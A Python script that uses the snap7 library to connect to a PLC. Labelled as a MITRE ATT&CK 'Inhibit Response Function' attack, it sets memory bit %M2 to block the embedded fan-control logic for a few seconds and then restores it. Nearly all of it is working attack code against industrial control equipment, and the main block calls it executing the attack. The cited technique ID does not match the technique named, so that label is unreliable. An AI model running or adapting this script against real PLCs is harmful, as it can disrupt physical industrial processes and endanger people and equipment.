import snap7
import time
import subprocess
import re  # For IP address extraction

# MITRE ATT&CK Technique: Inhibit Response Function
# T1647: Activate Firmware Update Mode

def get_plc_ip_address(program_code):
    """
    Extracts the PLC's IP address from the program code using regular expressions.

    Args:
        program_code: The string containing the PLC program code.

    Returns:
        The PLC's IP address as a string, or None if not found.
    """
    ip_address_match = re.search(r"IP Address:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", program_code)
    if ip_address_match:
        return ip_address_match.group(1)
    else:
        return None


def inhibit_response_function(plc_ip, rack=0, slot=1, toggle_bit="%M2", update_mode_time=5, restore_time=5):
    """
    Simulates activating and deactivating a "firmware update mode" to inhibit response functions.

    This function manipulates a memory bit (M_TOG at %M2 in this case) to simulate entering and exiting a 
    firmware update or similar mode that disrupts normal operations.  It turns the bit ON, waits, then turns it OFF.

    Args:
        plc_ip (str): The IP address of the PLC.
        rack (int): The rack number of the PLC.
        slot (int): The slot number of the PLC.
        toggle_bit (str):  The memory bit to toggle (e.g., "%M2").
        update_mode_time (int): Time (in seconds) to simulate being in "update mode".
        restore_time (int): Time to wait before restoring the original state.
    """

    plc = snap7.client.Client()

    try:
        plc.connect(plc_ip, rack, slot)
        print(f"Connected to PLC at {plc_ip}")

        # --- Step 1: Determine the area and byte/bit offset of the toggle bit ---
        area_code = toggle_bit[1]  # 'M' for memory
        address = int(toggle_bit[2:])  # Extract the address (e.g., 2 from %M2)
        byte_offset = address // 8
        bit_offset = address % 8

        # Convert area code to snap7 area
        if area_code == 'M':
            area = snap7.types.Areas.MK
        elif area_code == 'I':
            area = snap7.types.Areas.PE  # Input Area
        elif area_code == 'Q':
            area = snap7.types.Areas.PA  # Output Area
        else:
            raise ValueError("Invalid area code.  Must be 'M', 'I', or 'Q'")

        # --- Step 2: Read the current state of the bit ---
        byte_data = plc.read_area(area, 0, byte_offset, 1)
        original_value = (byte_data[0] >> bit_offset) & 1
        print(f"Original value of {toggle_bit}: {original_value}")

        # --- Step 3: Set the bit to 1 (activate "update mode") ---
        new_byte_data = bytearray(byte_data)
        new_byte_data[0] = (new_byte_data[0] | (1 << bit_offset))
        plc.write_area(area, 0, byte_offset, new_byte_data)
        print(f"Set {toggle_bit} to ON (1). Simulating entering update mode.")
        time.sleep(update_mode_time)


        # --- Step 4: Restore the original state ---

        if original_value == 0:
             new_byte_data = bytearray(byte_data)
             new_byte_data[0] = (new_byte_data[0] & ~(1 << bit_offset)) #Clear the bit if original was 0
             plc.write_area(area, 0, byte_offset, new_byte_data)
             print(f"Restoring {toggle_bit} to OFF (0)")
        else:
             new_byte_data = bytearray(byte_data)
             new_byte_data[0] = (new_byte_data[0] | (1 << bit_offset)) #Set the bit if original was 1
             plc.write_area(area, 0, byte_offset, new_byte_data)
             print(f"Restoring {toggle_bit} to ON (1)")
        time.sleep(restore_time)
        

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")

# --- Main ---

# The provided PLC program code (you can load this from a file if needed)
program_code = """
PROGRAM MainProgram
VAR
    M_ACTFAN AT %M1 : BOOL;     // Activate_FanA
    M_TOG AT %M2 : BOOL;        // Tog_Off
    Q_FAN AT %Q0.0 : BOOL;     // Fan output
    Q_REDA AT %Q0.4 : BOOL;     // FanA Red LED
    Q_GREENA AT %Q0.5 : BOOL;   // FanA Green LED
    SB_TB1S AT %S6 : BOOL;      // 1-second time base
    Counter0 AT %C0 : CTU;      // Counter with preset of 15
    Timer0 AT %TM0 : TP;        // Pulse timer
    Timer1 AT %TM1 : TON;        // On-delay timer
END_VAR

// Rung 0
// Counter parallel with fan activation
IF SB_TB1S THEN
    IF NOT Q_FAN THEN
        Counter0(CU := TRUE, PV := 15);
        IF Counter0.CV <= Counter0.PV THEN
            M_ACTFAN := TRUE;
        END_IF;
    END_IF;
END_IF;

// Rung 1
// Complex timer and output logic
IF M_ACTFAN THEN
    IF NOT M_TOG THEN
        // Both timers configured for 20s
        Timer0(IN := TRUE, PT := T#20S);
        Timer1(IN := TRUE, PT := T#20S);
        
        IF Timer0.Q OR Timer1.Q THEN
            Q_FAN := TRUE;
            Q_GREENA := TRUE;
        END_IF;
    END_IF;
END_IF;

// Rung 2
// Red LED control
IF NOT Q_FAN THEN
    Q_REDA := TRUE;
ELSE
    Q_REDA := FALSE;
END_IF;

END_PROGRAM
"""


# --- Get PLC IP Address ---
plc_ip = get_plc_ip_address(program_code)

if plc_ip:
    print(f"PLC IP address found: {plc_ip}")
else:
    print("PLC IP address not found in the program code.  Please specify it manually.")
    plc_ip = input("Enter the PLC IP address: ")  # Or hardcode it here if known.
    if not plc_ip:
        print("No IP address provided.  Exiting.")
        exit()


# --- Execute the attack ---
inhibit_response_function(plc_ip)

print("Script execution complete.")